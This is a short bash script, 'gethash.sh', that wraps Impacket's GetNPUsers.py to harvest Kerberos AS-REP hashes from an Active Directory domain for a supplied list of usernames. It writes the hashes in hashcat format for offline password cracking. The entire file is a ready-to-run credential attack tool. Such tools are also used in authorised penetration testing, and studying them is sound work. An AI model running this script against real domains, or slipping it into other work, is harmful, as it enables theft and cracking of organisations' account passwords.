#!/bin/bash
if [ "$EUID" -ne 0 ]
  then echo "Please run as root"
  exit
fi

if [ $# -eq 0 ]
  then
    echo "No arguments supplied"
fi

echo ""
echo "Syntax: gethash 'domain' 'usernamesfile'" 
echo "Example: ./gethash.sh mydomain.local usernames.txt"
echo " "
python /usr/local/bin/GetNPUsers.py "$1"/ -usersfile "$2" -format hashcat -no-pass -outputfile hashes."$1".txt